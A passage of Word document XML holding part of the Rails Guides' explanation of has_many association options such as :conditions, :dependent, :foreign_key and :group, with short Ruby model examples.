        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6744"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="22F4DCD4" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="59095692" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="564B0F5B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :confirmed_orders, :class_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Order",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1898FA9D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :conditions</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; { :confirmed</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FD329BC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="26C86817" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you use a hash-style </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:conditions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option, then record creation via this association will be automatically scoped using the hash. In this case, using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@customer.confirmed_orders.create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@customer.confirmed_orders.build</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will create orders where the confirmed column has the value </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714E013C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If you need to evaluate conditions dynamically at runtime, use a proc:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="7BB19BA1" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5892548E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00C2ABDF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :latest_orders, :class_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Order",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47484D26" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :conditions</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; proc { ["orders.created_at &gt; ?", 10.hours.ago] }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BC47B0E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="67AC5DA1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:counter_sql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A90EA4A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Normally Rails automatically generates the proper </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to count the association members. With the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:counter_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option, you can specify a complete </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> statement to count them yourself.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0478FBF1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you specify </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:finder_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> but not </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:counter_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then the counter </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will be generated by substituting the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>SELECT ... FROM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause of your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:finder_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> statement by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>SELECT COUNT(*) FROM</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="306604F9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D995AE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:destroy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then deleting this object will call the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>destroy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method on the associated objects to delete those objects. If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:delete_all</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then deleting this object will delete the associated objects </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>without</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> calling their </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>destroy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method. If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:nullify</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then deleting this object will set the foreign key in the associated objects to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:restrict</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then the deletion of the object is restricted if a dependent associated object exist and a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DeleteRestrictionError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> exception is raised.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A500A28" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The default behavior for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent =&gt; :restrict</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is to raise a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DeleteRestrictionError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> when associated objects exist. Since Rails 4.0 this behavior is being deprecated in favor of adding an error to the base model. To silence the warning in Rails 4.0, you should fix your code to not expect this Exception and add </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config.active_record.dependent_restrict_raises = false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to your application config.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA2611F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This option is ignored when you use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option on the association.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F74ABC5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.7 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:extend</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09EE5F50" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:extend</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option specifies a named module to extend the association proxy. Association extensions are discussed in detail </w:t>
      </w:r>
      <w:hyperlink r:id="rId217" w:anchor="association-extensions" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>later in this guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18CB4320" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.8 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:finder_sql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48DAEBE8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Normally Rails automatically generates the proper </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to fetch the association members. With the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:finder_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option, you can specify a complete </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> statement to fetch them yourself. If fetching objects requires complex multi-table </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t>, this may be necessary.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1198EF7D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.9 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:foreign_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33283779" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By convention, Rails assumes that the column used to hold the foreign key on the other model is the name of this model with the suffix </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> added. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:foreign_key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you set the name of the foreign key directly:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5784"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="733F7DCE" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28E4E51D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7036604D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders, :foreign_key</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "cust_id"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="711950D9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="65CA341B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In any case, Rails will not create foreign key columns for you. You need to explicitly define them as part of your migrations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="193DDBC8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.10 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:group</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752557AD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:group</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option supplies an attribute name to group the result set by, using a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>GROUP BY</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause in the finder </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8231"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="2F6B34EF" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="34A187C0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33E1ACFD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :line_items, :through</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :orders, :group</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "orders.id"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73B63063" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3EDA8F1D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.11 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B120A7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to specify second-order associations that should be eager-loaded when this association is used. For example, consider these models:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4344"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="37F8DBD0" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="633E8DB1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71CEB622" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="222E39B4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="626871E6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BE677A5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
